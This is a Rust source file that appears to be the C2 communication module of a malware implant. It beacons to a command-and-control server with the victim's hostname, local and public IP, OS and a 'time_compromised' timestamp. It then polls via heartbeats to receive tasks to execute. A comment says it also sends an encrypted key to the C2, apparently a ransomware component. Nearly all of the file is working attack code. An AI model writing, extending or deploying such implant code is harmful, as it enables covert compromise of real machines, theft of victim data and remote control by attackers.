use tokio::net::TcpStream;
use tokio_util::codec::{FramedRead, FramedWrite};
use futures::{SinkExt, StreamExt};
use std::time::Duration;
use gethostname::gethostname;
use public_ip;
use local_ip_address::local_ip;

use crate::communication::codec::JsonCodec;
use crate::communication::message::{AgentMessage, ServerMessage};
use crate::post::commands::AgentCommand;


/// Send message modular function
async fn send_message(addr: &str, message: AgentMessage, timeout_secs: u64) -> Result<Option<ServerMessage>, String> {
    println!("[*] Connecting to {}", addr);

    let stream = TcpStream::connect(addr).await.map_err(|e| format!("Connect failed: {}", e))?;
    let (read_half, write_half) = stream.into_split();
    let mut framed_rx = FramedRead::new(read_half, JsonCodec::<ServerMessage>::new());
    let mut framed_tx = FramedWrite::new(write_half, JsonCodec::<AgentMessage>::new());

    println!("[*] Sending message: {:?}", message);
    
    framed_tx.send(message).await.map_err(|e| format!("Send failed: {}", e))?;


    match tokio::time::timeout(Duration::from_secs(timeout_secs), framed_rx.next()).await {
        Ok(Some(Ok(msg))) => Ok(Some(msg)),
        Ok(Some(Err(e))) => Err(format!("Receive error: {:?}", e)),
        Ok(None) => Err("Connection closed by server".into()),
        Err(_) => Err("Timeout waiting for response".into()),
    }

}

/// Beacon C2 and send victim info and encrypted key to C2
/// if C2 unavailable, operate offline until can connect -> send in random intervals until connected
pub async fn initial_beacon(addr: &str, retries: u64, timeout: u64) -> (u64, String) {
    let beacon = match get_info().await {
        Ok(beacon) => beacon,
        Err(e) => {
            eprintln!("[-] Failed to get host info: {:?}", e);
            return (0, "NONE".to_string());
        }
    };

    for attempt in 1..=retries {
        println!("[*] Attempting beacon (attempt {}/{})", attempt, retries);
        match send_message(addr, beacon.clone(), timeout).await {
            Ok(Some(ServerMessage::Ack {
                agent_id,
                status,
                session_id,
            })) => {
                println!("[*] Received Ack from server (status: {})", status);
                return (agent_id, session_id);
            }
            Ok(Some(msg)) => {
                eprintln!("[!] Unexpected message: {:?}", msg);
                return (0, "NONE".to_string());
            }
            Err(e) => {
                eprintln!("[!] Beacon attempt failed: {}", e);
            }
            _ => {}
        }
    }

    eprintln!("[!] No Ack received after {} attempts. Operating offline.", retries);
    (0, "NONE".to_string())
}

pub async fn heartbeat(
    addr: &str, 
    agent_id: u64, 
    session_id: &str, 
    timeout_secs: u64, 
    result: Option<Vec<String>>) -> Option<Vec<AgentCommand>> {
    let heartbeat = AgentMessage::Heartbeat { 
        agent_id, 
        session_id: session_id.to_string(), 
        result 
    };

    match send_message(addr, heartbeat, timeout_secs).await {
        Ok(Some(ServerMessage::Noop { 
            agent_id: _, 
            session_id: _ 
        })) => {
            println!("[*] Received NOOP from C2");
            return None
        }
        Ok(Some(ServerMessage::Task { 
            agent_id: _, 
            session_id: _, 
            command 
        })) => {
            println!("[*] Received tasks from C2");
            return Some(command)
        }
        Ok(Some(ServerMessage::Disconnect { 
            agent_id:_, 
            session_id:_ 
        })) => {
            println!("[*] Received disconnect from C2");
            return None
        }
        Ok(Some(msg)) => {eprintln!("[!] Unexpected message: {:?}", msg);}
        Err(e) => {eprintln!("[!] Beacon attempt failed: {}", e)}
        _ => {}
    }

    return None
}

pub async fn get_info() -> Result<AgentMessage, Box<dyn std::error::Error>> {
    let hostname = gethostname();
    let local_ip = local_ip()?;
    let os = std::env::consts::OS;

    let public_ip = if let Some(ip) = public_ip::addr().await {
        ip.to_string()
    } else { local_ip.to_string() };

    let message = AgentMessage::Beacon { 
        hostname: hostname.to_string_lossy().to_string(), 
        ip: public_ip, 
        os: os.to_string(), 
        time_compromised: chrono::Local::now().to_rfc3339() 
    };



    Ok(message)
}